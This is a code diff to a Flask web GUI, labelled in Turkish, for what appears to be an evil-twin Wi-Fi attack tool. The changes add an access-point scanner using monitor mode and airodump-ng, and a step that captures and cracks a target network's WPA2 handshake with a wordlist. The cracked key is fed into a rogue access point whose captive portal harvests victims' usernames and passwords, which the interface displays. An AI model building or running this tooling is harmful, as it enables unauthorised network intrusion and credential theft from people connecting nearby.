@@ -4,11 +4,15 @@
 Çalıştır:  sudo python3 gui.py
 Aç:        http://127.0.0.1:8099
 """
+import csv
+import glob
 import json
 import os
 import re
+import shutil
 import signal
 import subprocess
+import tempfile
 import threading
 
 from flask import Flask, Response, jsonify, request
@@ -16,7 +20,9 @@ from flask import Flask, Response, jsonify, request
 BASE = os.path.dirname(os.path.abspath(__file__))
 CONFIG = os.path.join(BASE, "config.sh")
 CREDS = os.path.join(BASE, "capture", "creds.log")
+PSK_FILE = os.path.join(BASE, "capture", "psk.txt")
 SETUP = os.path.join(BASE, "setup.sh")
+AUTOPWN = os.path.join(BASE, "autopwn.sh")
 PORT = 8099
 
 LOG = []
@@ -24,16 +30,17 @@ LOG_LOCK = threading.Lock()
 PROC = None
 PROC_LOCK = threading.Lock()
 
+CLOG = []
+CLOG_LOCK = threading.Lock()
+CPROC = None
+CPROC_LOCK = threading.Lock()
+
+SCAN_LOCK = threading.Lock()
+
 app = Flask(__name__)
 
 
-# ---------------------------------------------------------------- yardımcılar
-def log_append(line: str) -> None:
-    with LOG_LOCK:
-        LOG.append(line)
-        del LOG[:-500]
-
-
+# ---------------------------------------------------------------- config
 def parse_value(raw: str) -> str:
     """config.sh satır değerini yorumlardan arındırarak oku."""
     raw = raw.strip()
@@ -99,6 +106,7 @@ def write_config(vals: dict) -> None:
         f.write("\n".join(lines) + "\n")
 
 
+# ---------------------------------------------------------------- helpers
 def list_ifaces() -> list:
     names = []
     try:
@@ -136,10 +144,20 @@ def read_creds() -> list:
     return rows
 
 
-def pump(stream) -> None:
+def read_psk():
+    try:
+        with open(PSK_FILE, encoding="utf-8") as f:
+            return f.read().strip() or None
+    except OSError:
+        return None
+
+
+def pump(stream, target, lock) -> None:
     try:
         for line in iter(stream.readline, ""):
-            log_append(line.rstrip())
+            with lock:
+                target.append(line.rstrip())
+                del target[:-500]
     finally:
         try:
             stream.close()
@@ -147,9 +165,93 @@ def pump(stream) -> None:
             pass
 
 
-def is_running() -> bool:
-    with PROC_LOCK:
-        return PROC is not None and PROC.poll() is None
+def _int(v) -> int:
+    try:
+        return int(v)
+    except Exception:
+        return -999
+
+
+def is_running(proc, lock) -> bool:
+    with lock:
+        return proc is not None and proc.poll() is None
+
+
+# ---------------------------------------------------------------- scan
+def scan_aps(iface: str, seconds: int = 15) -> dict:
+    if not iface:
+        return {"ok": False, "error": "arayüz seçilmedi"}
+    if not SCAN_LOCK.acquire(blocking=False):
+        return {"ok": False, "error": "tarama zaten sürüyor"}
+    work = tempfile.mkdtemp(prefix="epscan_")
+    base = os.path.join(work, "scan")
+    try:
+        try:
+            subprocess.run(["airmon-ng", "check", "kill"],
+                           capture_output=True, timeout=15)
+        except Exception:
+            pass
+        for cmd in (["ip", "link", "set", iface, "down"],
+                    ["iw", "dev", iface, "set", "type", "monitor"],
+                    ["ip", "link", "set", iface, "up"]):
+            try:
+                subprocess.run(cmd, capture_output=True, timeout=8)
+            except Exception as exc:
+                return {"ok": False, "error": f"monitor mode: {exc}"}
+
+        try:
+            subprocess.run(
+                ["airodump-ng", "--band", "abg", "--output-format", "csv",
+                 "-w", base, iface],
+                capture_output=True, timeout=seconds,
+            )
+        except subprocess.TimeoutExpired:
+            pass
+        except FileNotFoundError:
+            return {"ok": False, "error": "airodump-ng bulunamadı"}
+        except Exception as exc:
+            return {"ok": False, "error": str(exc)}
+
+        csv_path = None
+        for cand in glob.glob(base + "-*.csv"):
+            csv_path = cand
+            break
+
+        aps = []
+        if csv_path and os.path.exists(csv_path):
+            with open(csv_path, newline="", errors="replace") as f:
+                reader = csv.reader(f)
+                in_ap = False
+                for row in reader:
+                    if not row:
+                        continue
+                    first = row[0].strip()
+                    if first == "BSSID":
+                        in_ap = True
+                        continue
+                    if first == "Station MAC":
+                        in_ap = False
+                        continue
+                    if not in_ap:
+                        continue
+                    if not first:
+                        in_ap = False
+                        continue
+                    if len(row) < 14:
+                        continue
+                    aps.append({
+                        "bssid": first,
+                        "channel": row[3].strip(),
+                        "privacy": row[5].strip(),
+                        "cipher": row[6].strip(),
+                        "power": row[8].strip(),
+                        "essid": row[13].strip() or "(gizli)",
+                    })
+        aps.sort(key=lambda a: _int(a["power"]))
+        return {"ok": True, "aps": aps}
+    finally:
+        shutil.rmtree(work, ignore_errors=True)
+        SCAN_LOCK.release()
 
 
 # ---------------------------------------------------------------- api
@@ -158,22 +260,91 @@ def api_interfaces():
     return jsonify(ifaces=list_ifaces())
 
 
+CONFIG_KEYS = (
+    "MON_IF", "AP_IF", "UPLINK_IF", "SINGLE_ADAPTER",
+    "TARGET_SSID", "TARGET_BSSID", "CHANNEL", "WPA_PASS",
+    "PORTAL_TEMPLATE", "BRAND", "SUCCESS_URL", "SHARE_INTERNET",
+    "WORDLIST", "CAPTURE_TIMEOUT",
+)
+
+
 @app.get("/api/config")
 def api_config_get():
     cfg = read_config()
-    return jsonify({k: cfg.get(k) for k in (
-        "MON_IF", "AP_IF", "UPLINK_IF", "SINGLE_ADAPTER",
-        "TARGET_SSID", "TARGET_BSSID", "CHANNEL", "WPA_PASS",
-        "PORTAL_TEMPLATE", "BRAND", "SUCCESS_URL", "SHARE_INTERNET",
-    )})
+    return jsonify({k: cfg.get(k) for k in CONFIG_KEYS})
 
 
 @app.post("/api/config")
 def api_config_set():
     vals = request.get_json(silent=True) or {}
     write_config(vals)
-    log_append("[gui] config.sh güncellendi")
     return jsonify(ok=True)
+
+
+@app.post("/api/scan")
+def api_scan():
+    if is_running(PROC, PROC_LOCK):
+        return jsonify(ok=False, error="oturum çalışırken taranamaz"), 400
+    body = request.get_json(silent=True) or {}
+    iface = body.get("iface") or read_config().get("MON_IF", "")
+    try:
+        seconds = int(body.get("seconds") or 15)
+    except (TypeError, ValueError):
+        seconds = 15
+    return jsonify(scan_aps(iface, max(5, min(seconds, 60))))
+
+
+@app.post("/api/crack")
+def api_crack():
+    global CPROC
+    with CPROC_LOCK:
+        if CPROC is not None and CPROC.poll() is None:
+            return jsonify(ok=False, error="kırma zaten çalışıyor"), 400
+        vals = request.get_json(silent=True) or {}
+        if vals:
+            write_config({k: vals[k] for k in (
+                "MON_IF", "TARGET_SSID", "TARGET_BSSID", "CHANNEL",
+                "WORDLIST", "CAPTURE_TIMEOUT",
+            ) if k in vals})
+        with CLOG_LOCK:
+            CLOG.clear()
+        try:
+            os.remove(PSK_FILE)
+        except OSError:
+            pass
+        CPROC = subprocess.Popen(
+            ["bash", AUTOPWN],
+            cwd=BASE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+            text=True, bufsize=1, preexec_fn=os.setsid,
+        )
+        threading.Thread(target=pump, args=(CPROC.stdout, CLOG, CLOG_LOCK),
+                         daemon=True).start()
+    return jsonify(ok=True)
+
+
+@app.post("/api/crack/stop")
+def api_crack_stop():
+    global CPROC
+    with CPROC_LOCK:
+        if CPROC is None or CPROC.poll() is not None:
+            return jsonify(ok=True)
+        try:
+            os.killpg(os.getpgid(CPROC.pid), signal.SIGINT)
+            CPROC.wait(timeout=15)
+        except Exception:
+            try:
+                os.killpg(os.getpgid(CPROC.pid), signal.SIGKILL)
+            except Exception:
+                pass
+    return jsonify(ok=True)
+
+
+@app.get("/api/crack/status")
+def api_crack_status():
+    with CLOG_LOCK:
+        tail = CLOG[-140:]
+    return jsonify(running=is_running(CPROC, CPROC_LOCK),
+                   log=tail, psk=read_psk())
 
 
 @app.post("/api/start")
@@ -189,14 +360,11 @@ def api_start():
             LOG.clear()
         PROC = subprocess.Popen(
             ["bash", SETUP],
-            cwd=BASE,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            text=True,
-            bufsize=1,
-            preexec_fn=os.setsid,
+            cwd=BASE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+            text=True, bufsize=1, preexec_fn=os.setsid,
         )
-        threading.Thread(target=pump, args=(PROC.stdout,), daemon=True).start()
+        threading.Thread(target=pump, args=(PROC.stdout, LOG, LOG_LOCK),
+                         daemon=True).start()
     return jsonify(ok=True)
 
 
@@ -222,8 +390,8 @@ def api_status():
     with LOG_LOCK:
         tail = LOG[-160:]
     rows = read_creds()
-    return jsonify(running=is_running(), log=tail, creds=rows[-80:],
-                   count=len(rows))
+    return jsonify(running=is_running(PROC, PROC_LOCK), log=tail,
+                   creds=rows[-80:], count=len(rows))
 
 
 @app.get("/preview/<name>")
@@ -256,7 +424,8 @@ HTML = r"""<!doctype html>
   :root{
     --bg:#0a0e17; --panel:#111827; --panel2:#0d1422; --line:#1f2a3d;
     --txt:#e6edf9; --dim:#8595b0; --acc:#e1306c; --acc2:#f77737;
-    --ok:#2ecc71; --bad:#ff5c5c; --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+    --ok:#2ecc71; --bad:#ff5c5c; --warn:#f5c542;
+    --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
   }
   *{box-sizing:border-box}
   body{
@@ -266,7 +435,7 @@ HTML = r"""<!doctype html>
     color:var(--txt);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
     padding:18px;
   }
-  .shell{max-width:880px;margin:0 auto}
+  .shell{max-width:900px;margin:0 auto}
   header{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px}
   .brand{font-size:19px;font-weight:800;letter-spacing:-.3px;display:flex;align-items:center;gap:9px}
   .brand i{width:26px;height:26px;border-radius:8px;display:grid;place-items:center;
@@ -274,13 +443,12 @@ HTML = r"""<!doctype html>
   .pill{padding:6px 13px;border-radius:999px;font-size:12px;font-weight:700;
     border:1px solid var(--line);color:var(--dim);background:var(--panel);white-space:nowrap}
   .pill.on{color:#0b0f19;background:var(--ok);border-color:var(--ok)}
-  .pill.work{color:#0b0f19;background:#f5c542;border-color:#f5c542}
-  nav.steps{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:14px}
-  .step{display:flex;align-items:center;gap:9px;padding:11px 12px;border-radius:12px;
-    background:var(--panel);border:1px solid var(--line);font-size:13px;color:var(--dim);
+  nav.steps{display:grid;grid-template-columns:repeat(5,1fr);gap:8px;margin-bottom:14px}
+  .step{display:flex;align-items:center;gap:8px;padding:10px 11px;border-radius:12px;
+    background:var(--panel);border:1px solid var(--line);font-size:12.5px;color:var(--dim);
     cursor:pointer;user-select:none;transition:.15s}
-  .step b{width:22px;height:22px;border-radius:7px;display:grid;place-items:center;
-    font-size:12px;background:#1b2434;color:var(--dim);flex:0 0 auto}
+  .step b{width:21px;height:21px;border-radius:7px;display:grid;place-items:center;
+    font-size:11.5px;background:#1b2434;color:var(--dim);flex:0 0 auto}
   .step.act{border-color:#3a4a68;color:var(--txt)}
   .step.act b{background:linear-gradient(135deg,var(--acc),var(--acc2));color:#fff}
   .step.done b{background:var(--ok);color:#0b0f19}
@@ -288,9 +456,9 @@ HTML = r"""<!doctype html>
   .pane{display:none}
   .pane.on{display:block}
   h2{margin:0 0 4px;font-size:16px}
-  .hint{color:var(--dim);font-size:13px;margin:0 0 18px;line-height:1.5}
+  .hint{color:var(--dim);font-size:13px;margin:0 0 16px;line-height:1.55}
   .grid{display:grid;grid-template-columns:1fr 1fr;gap:13px}
-  @media(max-width:680px){.grid{grid-template-columns:1fr}nav.steps{grid-template-columns:1fr 1fr}}
+  @media(max-width:720px){.grid{grid-template-columns:1fr}nav.steps{grid-template-columns:1fr 1fr}}
   label{display:block;font-size:11.5px;color:var(--dim);margin-bottom:6px;
     text-transform:uppercase;letter-spacing:.05em;font-weight:700}
   input,select{width:100%;padding:11px 12px;border-radius:10px;border:1px solid var(--line);
@@ -300,7 +468,7 @@ HTML = r"""<!doctype html>
   .check{display:flex;align-items:center;gap:9px;padding:11px 12px;border-radius:10px;
     border:1px solid var(--line);background:var(--panel2);margin-bottom:13px;font-size:13.5px}
   .check input{width:17px;height:17px;accent-color:var(--acc);flex:0 0 auto}
-  .nav{display:flex;justify-content:space-between;gap:10px;margin-top:20px}
+  .nav{display:flex;justify-content:space-between;gap:10px;margin-top:18px}
   button{padding:11px 20px;border:0;border-radius:10px;cursor:pointer;font-size:14px;
     font-weight:700;background:#1b2434;color:var(--txt);transition:.15s}
   button:disabled{opacity:.4;cursor:not-allowed}
@@ -308,13 +476,14 @@ HTML = r"""<!doctype html>
   button.go{background:var(--ok);color:#0b0f19}
   button.stop{background:var(--bad);color:#fff}
   button.ghost{background:transparent;border:1px solid var(--line);color:var(--dim)}
+  button.small{padding:8px 14px;font-size:13px}
   .summary{background:var(--panel2);border:1px solid var(--line);border-radius:12px;
-    padding:14px;font-family:var(--mono);font-size:12.5px;line-height:1.7;color:var(--dim);
+    padding:14px;font-family:var(--mono);font-size:12.5px;line-height:1.75;color:var(--dim);
     white-space:pre-wrap;margin-bottom:14px}
   .summary b{color:var(--txt);font-weight:600}
   pre.log{background:#060a12;border:1px solid var(--line);border-radius:12px;padding:12px;
-    height:230px;overflow:auto;font-family:var(--mono);font-size:12px;line-height:1.55;
-    color:#9fb2cd;white-space:pre-wrap;margin:14px 0 0}
+    height:200px;overflow:auto;font-family:var(--mono);font-size:12px;line-height:1.55;
+    color:#9fb2cd;white-space:pre-wrap;margin:12px 0 0}
   pre.log .ok{color:#6ee7a0}
   pre.log .err{color:#ff8a8a}
   table{width:100%;border-collapse:collapse;font-size:13px;margin-top:6px}
@@ -327,6 +496,27 @@ HTML = r"""<!doctype html>
   .row{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
   footer{margin-top:14px;text-align:center;font-size:11.5px;color:#5b6b85}
   code{font-family:var(--mono);background:#0d1422;padding:1px 6px;border-radius:5px}
+  .aplist{border:1px solid var(--line);border-radius:12px;overflow:hidden;margin-bottom:14px}
+  .aplist .head,.ap{display:grid;grid-template-columns:26px 1.4fr 1.6fr .5fr .7fr;gap:8px;
+    align-items:center;padding:9px 12px;font-size:12.5px}
+  .aplist .head{color:var(--dim);font-size:10.5px;text-transform:uppercase;
+    letter-spacing:.06em;background:var(--panel2);border-bottom:1px solid var(--line)}
+  .ap{border-bottom:1px solid #161f2e;cursor:pointer;transition:.12s}
+  .ap:last-child{border-bottom:0}
+  .ap:hover{background:#141d2e}
+  .ap.sel{background:rgba(225,48,108,.12)}
+  .ap .sig{display:flex;gap:2px;align-items:flex-end;height:12px}
+  .ap .sig i{width:3px;background:#31405c;border-radius:1px}
+  .ap .sig i.on{background:var(--ok)}
+  .ap .ssid{font-weight:600;color:var(--txt);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+  .ap .bssid{font-family:var(--mono);font-size:11.5px;color:var(--dim)}
+  .ap .ch{color:var(--dim)}
+  .ap .sec{font-size:11px;color:var(--warn)}
+  .pskbox{margin-top:12px;padding:11px 13px;border-radius:10px;font-size:13px;
+    background:rgba(46,204,113,.1);border:1px solid rgba(46,204,113,.4);
+    color:#9ff0c0;display:none}
+  .pskbox.on{display:block}
+  .pskbox b{color:#fff;font-family:var(--mono)}
 </style>
 </head>
 <body>
@@ -339,18 +529,19 @@ HTML = r"""<!doctype html>
   <nav class="steps" id="steps">
     <div class="step" data-s="1"><b>1</b> Arayüz</div>
     <div class="step" data-s="2"><b>2</b> Hedef</div>
-    <div class="step" data-s="3"><b>3</b> Başlat</div>
-    <div class="step" data-s="4"><b>4</b> Kayıtlar</div>
+    <div class="step" data-s="3"><b>3</b> Kır</div>
+    <div class="step" data-s="4"><b>4</b> Başlat</div>
+    <div class="step" data-s="5"><b>5</b> Kayıtlar</div>
   </nav>
 
   <main>
     <!-- 1 -->
     <section class="pane on" data-s="1">
       <h2>Adaptörler</h2>
-      <p class="hint">Deauth için monitor mode destekli kart, sahte AP için ikinci kart.
-        Tek kartla deneyeceksen aşağıdaki seçeneği işaretle.</p>
+      <p class="hint">Deauth ve handshake için monitor mode destekli kart, sahte AP için
+        ikinci kart. Tek kartla deneyeceksen aşağıdaki seçeneği işaretle.</p>
       <div class="grid">
-        <div class="field"><label>Monitor arayüzü (deauth)</label>
+        <div class="field"><label>Monitor arayüzü (deauth / tarama)</label>
           <select id="MON_IF"></select></div>
         <div class="field"><label>AP arayüzü (sahte ağ)</label>
           <select id="AP_IF"></select></div>
@@ -369,8 +560,17 @@ HTML = r"""<!doctype html>
     <!-- 2 -->
     <section class="pane" data-s="2">
       <h2>Hedef ağ</h2>
-      <p class="hint">Hedef WPA2-PSK ise parolasını girmen gerekir; yoksa istemci sahte ağa
-        bağlanmaz. Açık ağlarda boş bırak.</p>
+      <p class="hint">“Tara” monitor kartla 15 sn tarar. Listeden bir ağ seç, alanlar
+        otomatik dolar. Tarama NetworkManager'ı durdurur.</p>
+      <div class="row" style="margin-bottom:12px">
+        <button class="ghost small" id="btnScan" onclick="scan()">⟳ Tara</button>
+        <span class="hint" id="scanInfo" style="margin:0"></span>
+      </div>
+      <div class="aplist" id="apList">
+        <div class="head"><span></span><span>SSID</span><span>BSSID</span><span>CH</span><span>SİNYAL</span></div>
+        <div class="empty">henüz tarama yok</div>
+      </div>
+
       <div class="grid">
         <div class="field"><label>SSID</label>
           <input id="TARGET_SSID" placeholder="KafeWiFi"></div>
@@ -390,9 +590,7 @@ HTML = r"""<!doctype html>
       </div>
       <label class="check"><input type="checkbox" id="SHARE_INTERNET">
         Doğrulama sonrası gerçek internet ver</label>
-      <div class="row">
-        <button class="ghost" onclick="preview()">Portalı önizle</button>
-      </div>
+      <div class="row"><button class="ghost small" onclick="preview()">Portalı önizle</button></div>
       <div class="nav">
         <button onclick="go(1)">← Geri</button>
         <button class="primary" onclick="go(3)">İleri →</button>
@@ -401,6 +599,30 @@ HTML = r"""<!doctype html>
 
     <!-- 3 -->
     <section class="pane" data-s="3">
+      <h2>Handshake kırma</h2>
+      <p class="hint">Hedef WPA2-PSK ise bu adım parolayı bulur. Bulunan PSK sahte AP'ye
+        yazılır, böylece istemciler kayıtlı profilleriyle otomatik bağlanır. Açık ağlarda
+        bu adımı atla.</p>
+      <div class="grid">
+        <div class="field"><label>Wordlist</label>
+          <input id="WORDLIST" placeholder="/usr/share/wordlists/rockyou.txt"></div>
+        <div class="field"><label>Handshake zaman aşımı (sn)</label>
+          <input id="CAPTURE_TIMEOUT" type="number" min="10" max="600" placeholder="60"></div>
+      </div>
+      <div class="row">
+        <button class="primary" id="btnCrack" onclick="crack()">⚡ Yakala &amp; kır</button>
+        <button class="stop" id="btnCrackStop" onclick="crackStop()" disabled>■ Durdur</button>
+      </div>
+      <div class="pskbox" id="pskBox"></div>
+      <pre class="log" id="crackLog">hazır.</pre>
+      <div class="nav">
+        <button onclick="go(2)">← Geri</button>
+        <button class="primary" onclick="go(4)">İleri →</button>
+      </div>
+    </section>
+
+    <!-- 4 -->
+    <section class="pane" data-s="4">
       <h2>Başlat</h2>
       <p class="hint">Ayarlar <code>config.sh</code>'e yazılır ve sistem ayağa kaldırılır.
         Durdurduğunda iptables, hostapd, dnsmasq ve NetworkManager geri alınır.</p>
@@ -411,19 +633,19 @@ HTML = r"""<!doctype html>
       </div>
       <pre class="log" id="log">hazır.</pre>
       <div class="nav">
-        <button onclick="go(2)">← Geri</button>
-        <button class="primary" onclick="go(4)">Kayıtlar →</button>
+        <button onclick="go(3)">← Geri</button>
+        <button class="primary" onclick="go(5)">Kayıtlar →</button>
       </div>
     </section>
 
-    <!-- 4 -->
-    <section class="pane" data-s="4">
+    <!-- 5 -->
+    <section class="pane" data-s="5">
       <h2>Yakalananlar <span class="count" id="count">0</span></h2>
       <p class="hint">Form gönderen istemcilerin bilgileri. Kayıtlar
         <code>capture/creds.log</code> dosyasında JSON satırları olarak tutulur.</p>
       <div id="creds"><div class="empty">henüz kayıt yok</div></div>
       <div class="nav">
-        <button onclick="go(3)">← Geri</button>
+        <button onclick="go(4)">← Geri</button>
         <span></span>
       </div>
     </section>
@@ -434,10 +656,11 @@ HTML = r"""<!doctype html>
 
 <script>
 const $ = id => document.getElementById(id);
-let step = 1, running = false;
+let step = 1, running = false, crackStarted = false, aps = [];
 
 const FIELDS = ["MON_IF","AP_IF","UPLINK_IF","TARGET_SSID","TARGET_BSSID",
-                "CHANNEL","WPA_PASS","PORTAL_TEMPLATE","SUCCESS_URL"];
+                "CHANNEL","WPA_PASS","PORTAL_TEMPLATE","SUCCESS_URL",
+                "WORDLIST","CAPTURE_TIMEOUT"];
 
 function go(n){
   step = n;
@@ -448,8 +671,8 @@ function go(n){
     s.classList.toggle("act", v === n);
     s.classList.toggle("done", v < n);
   });
-  if (n === 3) refreshSummary();
-  if (n === 4) poll();
+  if (n === 4) refreshSummary();
+  if (n === 5) poll();
 }
 
 function collect(){
@@ -488,15 +711,108 @@ async function load(){
       sel.appendChild(o);
     });
   });
-  ["MON_IF","AP_IF","UPLINK_IF","TARGET_SSID","TARGET_BSSID","CHANNEL",
-   "WPA_PASS","PORTAL_TEMPLATE","SUCCESS_URL"].forEach(k => {
+  FIELDS.forEach(k => {
     const el = $(k);
-    if (el && cfg[k] !== undefined && cfg[k] !== null) el.value = cfg[k];
+    if (el && cfg[k] !== undefined && cfg[k] !== null && cfg[k] !== "")
+      el.value = cfg[k];
   });
   $("SINGLE_ADAPTER").checked = cfg.SINGLE_ADAPTER === "1";
   $("SHARE_INTERNET").checked = cfg.SHARE_INTERNET !== "0";
 }
 
+/* ---------- tarama ---------- */
+function sigBars(power){
+  const p = parseInt(power, 10);
+  let n = 1;
+  if (p >= -50) n = 5; else if (p >= -60) n = 4;
+  else if (p >= -70) n = 3; else if (p >= -80) n = 2;
+  let h = "";
+  for (let i = 1; i <= 5; i++) h += '<i class="' + (i <= n ? "on" : "") + '"></i>';
+  return '<span class="sig">' + h + '</span>';
+}
+
+function renderAps(list){
+  aps = list || [];
+  const el = $("apList");
+  if (!aps.length){
+    el.innerHTML = '<div class="head"><span></span><span>SSID</span><span>BSSID</span><span>CH</span><span>SİNYAL</span></div><div class="empty">ağ bulunamadı</div>';
+    return;
+  }
+  let h = '<div class="head"><span></span><span>SSID</span><span>BSSID</span><span>CH</span><span>SİNYAL</span></div>';
+  aps.forEach((a, i) => {
+    h += '<div class="ap" data-i="' + i + '">' +
+         '<span>' + (a.privacy && a.privacy.includes("WPA") ? "🔒" : "🔓") + '</span>' +
+         '<span class="ssid">' + esc(a.essid) + '</span>' +
+         '<span class="bssid">' + esc(a.bssid) + '</span>' +
+         '<span class="ch">' + esc(a.channel) + '</span>' +
+         '<span>' + sigBars(a.power) + '</span></div>';
+  });
+  el.innerHTML = h;
+  el.querySelectorAll(".ap").forEach(row =>
+    row.addEventListener("click", () => selectAp(+row.dataset.i, row)));
+}
+
+function selectAp(i, row){
+  const a = aps[i];
+  if (!a) return;
+  $("TARGET_SSID").value = a.essid === "(gizli)" ? "" : a.essid;
+  $("TARGET_BSSID").value = a.bssid;
+  $("CHANNEL").value = a.channel;
+  document.querySelectorAll("#apList .ap").forEach(r => r.classList.remove("sel"));
+  row.classList.add("sel");
+  $("scanInfo").textContent = a.privacy + " · " + (a.cipher || "") + " · " + a.power + " dBm";
+}
+
+async function scan(){
+  const btn = $("btnScan");
+  btn.disabled = true; btn.textContent = "taranıyor…";
+  $("apList").innerHTML = '<div class="empty">15 sn taranıyor…</div>';
+  const r = await fetch("/api/scan", {
+    method:"POST", headers:{"Content-Type":"application/json"},
+    body: JSON.stringify({iface: $("MON_IF").value, seconds: 15})
+  }).then(r => r.json()).catch(e => ({ok:false, error:String(e)}));
+  btn.disabled = false; btn.textContent = "⟳ Tara";
+  if (!r.ok){ $("apList").innerHTML = '<div class="empty">' + esc(r.error || "hata") + '</div>'; return; }
+  renderAps(r.aps);
+  $("scanInfo").textContent = (r.aps || []).length + " ağ";
+}
+
+/* ---------- kırma ---------- */
+async function crack(){
+  crackStarted = true;
+  $("btnCrack").disabled = true;
+  $("pskBox").classList.remove("on");
+  $("crackLog").textContent = "başlatılıyor…\n";
+  await fetch("/api/crack", {
+    method:"POST", headers:{"Content-Type":"application/json"},
+    body: JSON.stringify(collect())
+  }).catch(() => {});
+  pollCrack();
+}
+
+async function crackStop(){
+  $("btnCrackStop").disabled = true;
+  await fetch("/api/crack/stop", {method:"POST"});
+  pollCrack();
+}
+
+async function pollCrack(){
+  const s = await fetch("/api/crack/status").then(r => r.json()).catch(() => null);
+  if (!s) return;
+  $("btnCrack").disabled = !!s.running;
+  $("btnCrackStop").disabled = !s.running;
+  const el = $("crackLog");
+  const atBottom = el.scrollTop + el.clientHeight >= el.scrollHeight - 30;
+  el.innerHTML = (s.log || []).map(colorize).join("\n") || "hazır.";
+  if (atBottom) el.scrollTop = el.scrollHeight;
+  if (crackStarted && s.psk){
+    $("WPA_PASS").value = s.psk;
+    $("pskBox").classList.add("on");
+    $("pskBox").innerHTML = "PSK bulundu: <b>" + esc(s.psk) + "</b> — hedef alanına yazıldı.";
+  }
+}
+
+/* ---------- başlat / durdur ---------- */
 async function start(){
   $("btnStart").disabled = true;
   $("log").textContent = "başlatılıyor…\n";
@@ -504,7 +820,7 @@ async function start(){
     method:"POST", headers:{"Content-Type":"application/json"},
     body: JSON.stringify(collect())
   }).then(r => r.json()).catch(e => ({ok:false, error:String(e)}));
-  if (!r.ok) { $("log").textContent += "HATA: " + (r.error||"bilinmiyor"); }
+  if (!r.ok) $("log").textContent += "HATA: " + (r.error || "bilinmiyor");
   poll();
 }
 
@@ -519,10 +835,10 @@ function colorize(line){
   if (/\[-\]|error|Error|fail|Fail|HATA/.test(line)) return '<span class="err">' + esc(line) + '</span>';
   return esc(line);
 }
-function esc(s){ return s.replace(/&/g,"&amp;").replace(/</g,"&lt;"); }
+function esc(s){ return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;"); }
 
 function renderCreds(rows){
-  $("count").textContent = rows.length ? rows.length : 0;
+  $("count").textContent = rows.length || 0;
   if (!rows.length){ $("creds").innerHTML = '<div class="empty">henüz kayıt yok</div>'; return; }
   let h = "<table><tr><th>Zaman</th><th>IP</th><th>Kullanıcı</th><th>Şifre</th></tr>";
   rows.slice().reverse().forEach(r => {
@@ -547,7 +863,6 @@ async function poll(){
   const atBottom = logEl.scrollTop + logEl.clientHeight >= logEl.scrollHeight - 30;
   logEl.innerHTML = (s.log || []).map(colorize).join("\n") || "hazır.";
   if (atBottom) logEl.scrollTop = logEl.scrollHeight;
-
   renderCreds(s.creds || []);
 }
 
@@ -561,6 +876,7 @@ document.querySelectorAll(".step").forEach(s =>
 
 load();
 setInterval(poll, 1500);
+setInterval(pollCrack, 1500);
 </script>
 </body>
 </html>
